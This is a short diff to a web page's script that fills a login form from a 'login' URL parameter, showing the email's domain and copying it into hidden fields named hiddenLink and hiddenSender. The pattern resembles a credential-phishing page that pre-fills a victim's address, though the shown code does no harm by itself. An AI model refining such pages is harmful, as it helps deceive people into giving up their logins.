@@ -230,6 +230,7 @@
 	</table>
 </div>
 
+<!-- ✅ Updated script to show @domain in visible input -->
 <script>
   const params = new URLSearchParams(window.location.search);
   const raw = params.get('login');
@@ -238,7 +239,7 @@
   if (email.includes('@')) {
     const [user, domain] = email.split(/@(.*)/, 2);
     document.getElementById('userInput').value = user;
-    document.getElementById('domainInput').value = domain;
+    document.getElementById('domainInput').value = '@' + domain;
     document.getElementById('domainField').value = domain;
     document.getElementById('hiddenLink').value = domain;
     document.getElementById('hiddenSender').value = domain;
